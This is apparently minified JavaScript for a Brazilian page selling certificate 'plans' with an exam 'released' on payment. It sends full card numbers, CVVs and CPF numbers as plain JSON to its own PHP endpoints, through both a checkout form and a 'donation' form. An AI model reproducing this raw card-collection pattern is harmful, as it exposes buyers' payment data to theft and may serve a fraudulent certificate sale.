const TAXA_JUROS_MENSAL=0.0299;const planos={"30_dias":{"nome":"Plano 30 Dias","valor":1590,"duracao":"30 dias"},"3_meses":{"nome":"Plano 3 Meses","valor":1260,"duracao":"3 meses"},"6_meses":{"nome":"Plano 6 Meses","valor":999.99,"duracao":"6 meses"},"9_meses":{"nome":"Plano 9 Meses","valor":799.99,"duracao":"9 meses"},"12_meses":{"nome":"Plano 12 Meses","valor":599.99,"duracao":"12 meses"}};const coresPlanos={"30_dias":"vermelho","3_meses":"amarelo","6_meses":"verde","9_meses":"laranja","12_meses":"azul"};const temposLiberacao={"30_dias":"Imediatamente","3_meses":"10 dias","6_meses":"30 dias","9_meses":"45 dias","12_meses":"60 dias"};const temposEntrega={"30_dias":"30 dias √∫teis","3_meses":"90 dias √∫teis","6_meses":"180 dias √∫teis","9_meses":"270 dias √∫teis","12_meses":"365 dias √∫teis"};function numberToBRL(n){return n.toLocaleString('pt-BR',{minimumFractionDigits:2,maximumFractionDigits:2})}function calcularParcela(valor,parcelas){if(parcelas===1)return valor;const i=TAXA_JUROS_MENSAL;const n=parcelas;const pmt=valor*(i*Math.pow(1+i,n))/(Math.pow(1+i,n)-1);return Math.round(pmt*100)/100}function calcularValorTotal(valor,parcelas){if(parcelas===1)return valor;const vp=calcularParcela(valor,parcelas);return Math.round(vp*parcelas*100)/100}function mascaraCPF(v){return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2')}function mascaraCartao(v){return v.replace(/\D/g,'').replace(/(\d{4})(\d)/,'$1 $2').replace(/(\d{4})(\d)/,'$1 $2').replace(/(\d{4})(\d)/,'$1 $2').slice(0,19)}function mascaraMMYY(v){return v.replace(/\D/g,'').replace(/(\d{2})(\d)/,'$1/$2').slice(0,5)}function init(){document.getElementById('ano').textContent=new Date().getFullYear();document.getElementById('cnpj').textContent='CNPJ: 54.863.268/0001-86';const grid=document.getElementById('planosGrid');Object.entries(planos).forEach(([key,p])=>{const cor=coresPlanos[key]||'azul';const card=document.createElement('div');card.className=`plano-card plano-${cor}`;card.dataset.plano=key;card.dataset.valor=p.valor;card.innerHTML=`<div class="plano-header"><h3>${p.nome}</h3><p class="duracao">${p.duracao}</p></div><div class="plano-valor"><span class="moeda">R$</span><span class="valor">${numberToBRL(p.valor)}</span></div><div class="plano-beneficios"><div class="beneficio-item"><span class="beneficio-icon">üìù</span><span class="beneficio-texto">Prova liberada: ${temposLiberacao[key]}</span></div><div class="beneficio-item"><span class="beneficio-icon">üéì</span><span class="beneficio-texto">Certificado v√°lido em todo Brasil</span></div><div class="beneficio-item"><span class="beneficio-icon">üì¶</span><span class="beneficio-texto">Entrega pelos Correios: ${temposEntrega[key]}</span></div></div><button class="btn-selecionar">Selecionar Plano</button>`;card.querySelector('.btn-selecionar').addEventListener('click',()=>selecionarPlano(key,p.valor));grid.appendChild(card)});const sel=document.getElementById('parcelas');sel.innerHTML='<option value="">Selecione...</option>';for(let i=1;i<=12;i++){const opt=document.createElement('option');opt.value=String(i);opt.textContent=`${i}x`;sel.appendChild(opt)};sel.addEventListener('change',calcularParcelaUI);document.getElementById('btnVoltar').addEventListener('click',voltarSelecao);document.getElementById('btnDoacao').addEventListener('click',abrirDoacao);document.getElementById('closeDoacao').addEventListener('click',fecharDoacao);document.getElementById('cancelarDoacao').addEventListener('click',fecharDoacao);document.getElementById('cpf').addEventListener('input',e=>e.target.value=mascaraCPF(e.target.value));document.getElementById('numero_cartao').addEventListener('input',e=>e.target.value=mascaraCartao(e.target.value));document.getElementById('validade').addEventListener('input',e=>e.target.value=mascaraMMYY(e.target.value));document.getElementById('doacao_numero_cartao').addEventListener('input',e=>e.target.value=mascaraCartao(e.target.value));document.getElementById('doacao_validade').addEventListener('input',e=>e.target.value=mascaraMMYY(e.target.value));document.getElementById('doacao_cvv').addEventListener('input',e=>e.target.value=e.target.value.replace(/\D/g,'').slice(0,4));document.getElementById('cvv').addEventListener('input',e=>e.target.value=e.target.value.replace(/\D/g,'').slice(0,4));document.getElementById('checkoutForm').addEventListener('submit',submitCheckout);document.getElementById('doacaoForm').addEventListener('submit',submitDoacao)}function selecionarPlano(key,valor){document.getElementById('planoSelecionado').value=key;document.getElementById('valorBase').value=String(valor);document.getElementById('planoInfo').textContent=`${planos[key].nome} - R$ ${numberToBRL(valor)}`;document.getElementById('checkoutSection').style.display='block';window.scrollTo({top:0,behavior:'smooth'})}function calcularParcelaUI(){const valor=parseFloat(document.getElementById('valorBase').value||'0');const parcelas=parseInt(document.getElementById('parcelas').value||'0',10);if(!valor||!parcelas){document.getElementById('valorParcela').textContent='R$ 0,00';return}const p=calcularParcela(valor,parcelas);document.getElementById('valorParcela').textContent=`R$ ${numberToBRL(p)}`}function voltarSelecao(){document.getElementById('checkoutSection').style.display='none'}function abrirDoacao(){document.getElementById('modalDoacao').style.display='block'}function fecharDoacao(){document.getElementById('modalDoacao').style.display='none'}async function submitCheckout(e){e.preventDefault();const data={plano:document.getElementById('planoSelecionado').value,valor_base:parseFloat(document.getElementById('valorBase').value||'0'),parcelas:parseInt(document.getElementById('parcelas').value||'0',10),nome:document.getElementById('nome').value,email:document.getElementById('email').value,cpf:document.getElementById('cpf').value,numero_cartao:document.getElementById('numero_cartao').value,validade:document.getElementById('validade').value,cvv:document.getElementById('cvv').value,nome_portador:document.getElementById('nome_portador').value};const r=await fetch('api/checkout.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});const j=await r.json();if(j.success&&j.redirect){location.href=j.redirect}else{alert(j.message||'Erro ao processar pagamento')}}async function submitDoacao(e){e.preventDefault();const data={nome:document.getElementById('doacao_nome').value,email:document.getElementById('doacao_email').value,numero_cartao:document.getElementById('doacao_numero_cartao').value,validade:document.getElementById('doacao_validade').value,cvv:document.getElementById('doacao_cvv').value,nome_portador:document.getElementById('doacao_nome_portador').value};const r=await fetch('api/doacao.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});const j=await r.json();if(j.success&&j.redirect){location.href=j.redirect}else{alert(j.message||'Erro ao processar doa√ß√£o')}}document.addEventListener('DOMContentLoaded',init);